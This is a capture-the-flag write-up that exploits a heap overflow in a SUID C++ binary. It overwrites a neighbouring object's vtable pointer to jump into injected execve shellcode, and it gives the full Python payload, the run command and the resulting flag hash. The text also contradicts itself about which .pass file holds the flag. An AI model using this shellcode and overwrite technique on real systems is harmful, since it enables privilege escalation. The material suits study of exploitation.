# Level 9

Binary: 32-bit ELF, SUID level10, dynamically linked C++. **NX disabled** (unique on this level).

## Analysis

### Ghidra output

```cpp
class N {
    void *vtable;            // offset 0
    char  annotation[100];   // offset 4
    int   value;             // offset 0x68 (104)
    // total size = 108 = 0x6c

    N(int v) {
        vtable = &N_vtable;
        value  = v;
    }

    void setAnnotation(char *s) {
        memcpy(this + 4, s, strlen(s));   // NO bounds check → overflow
    }

    int operator+(N &other);   // virtual
};

int main(int argc, char **argv) {
    if (argc < 2) exit(1);
    N *a = new N(5);
    N *b = new N(6);
    a->setAnnotation(argv[1]);      // overflow a
    (*b->vtable[0])(b, a);          // virtual call through b's vtable
}
```

Two objects allocated back-to-back on the heap. `setAnnotation` writes argv[1] into the annotation with no bounds check, so it can overflow into object b.

## Heap layout

```
(gdb) b *0x08048677
(gdb) r AAAA
(gdb) x/wx $esp+0x14     → a = 0x0804a008
(gdb) x/wx $esp+0x10     → b = 0x0804a078
```

Distance: `0x0804a078 - 0x0804a008` = `0x70` = **112 bytes**.

Object is 108 bytes, chunk distance is 112, so only 4 bytes of malloc metadata between objects (glibc "size reuse" trick: in-use chunks extend into the next chunk's prev_size field).

```
a+0   : vtable ptr (a.vtable)
a+4   : start of a.annotation  ← setAnnotation writes here
a+104 : a.value
a+108 : chunk b's size field (malloc metadata)
a+112 : b.vtable ptr  ← we want to overwrite this
```

## The virtual call

```asm
mov    0x10(%esp),%eax      ; eax = b
mov    (%eax),%eax           ; eax = *b = vtable pointer
mov    (%eax),%edx           ; edx = *vtable = first function pointer
call   *%edx                 ; call it
```

Two dereferences. To hijack:
- `*b` must equal address X.
- `*X` must equal shellcode address.

Both X and the shellcode can live inside the annotation we control.

## Payload (112 bytes)

```
offset 0-44   : shellcode (Aleph One execve, 45 bytes)
offset 45-99  : padding (55 'A')
offset 100-103: shellcode address = a+4 = 0x0804a00c    ← "fake vtable entry"
offset 104-107: padding (4 'A'; overwrites chunk b size, harmless here)
offset 108-111: pointer to fake entry = a+104 = 0x0804a070  ← new b.vtable
```

Runtime chain after memcpy:

```
eax = *b = 0x0804a070           (our injected vtable pointer)
edx = *(0x0804a070) = 0x0804a00c (our injected "vtable entry")
call 0x0804a00c → shellcode at a+4 executes
```

NX is off on level9, so code on the heap runs fine.

## Running the exploit

Writing the Python inline on the command line sometimes breaks due to terminal wrap. Use a file instead:

```bash
cat > /tmp/exploit9.py << 'EOF'
import sys
sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
payload = sc + "A"*55 + "\x0c\xa0\x04\x08" + "AAAA" + "\x70\xa0\x04\x08"
sys.stdout.write(payload)
EOF

./level9 "$(python /tmp/exploit9.py)"
```

The `<<'EOF'` heredoc stops the shell from interpreting `$`, `\`, etc.

Then inside the spawned shell:

```
cat /home/user/level9/.pass
```

Flag: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

(Note: the flag lives in `/home/user/bonus0/.pass`, not `/home/user/level9/.pass`. The SUID chain ends at bonus0, so a level9 shell has bonus0 privileges.)

## Notes

### Why Aleph One's shellcode (not the 23-byte one)

This shellcode sets `edx` explicitly (`lea edx, [esi+12]` pointing to a NULL). The shorter 23-byte shellcode leaves `edx` untouched, and if the context has garbage in `edx`, execve fails with EFAULT. Context is unpredictable at a virtual call, so the safer shellcode is worth the extra bytes.

### Why argv and not stdin

`memcpy(this+4, argv[1], strlen(argv[1]))`. argv[1] is a null-terminated command-line arg. Our payload has no internal null bytes, so strlen returns 112 and memcpy writes all 112.

### NX disabled matters

Every other level has NX enabled, which blocks code execution on the stack and heap. Here NX is off, so we can jump directly into our shellcode on the heap. No ROP gadgets needed.

### Remember the structure

Two pointer levels in the virtual call:
- b holds a pointer (vtable)
- vtable[0] holds a function pointer
- that function is called

So the payload needs two addresses: one pointing to a location containing the shellcode address, and that location containing the shellcode address itself. Plant both inside the annotation buffer, then overwrite b.vtable to point to the first one.
